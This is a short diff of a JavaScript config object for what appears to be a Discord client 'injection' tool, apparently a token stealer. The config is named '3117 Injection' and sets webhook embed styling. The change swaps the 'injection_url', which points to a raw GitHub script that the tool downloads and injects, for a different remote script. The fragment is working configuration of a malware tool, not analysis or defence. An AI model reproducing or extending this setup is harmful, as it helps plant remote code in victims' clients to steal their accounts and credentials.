@@ -14,7 +14,7 @@ const config = {
   embed_name: '3117 Injection', 
   embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/r3nko/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/xvy0/ulol/main/injection/main/index.js', 
   /**
    
    **/
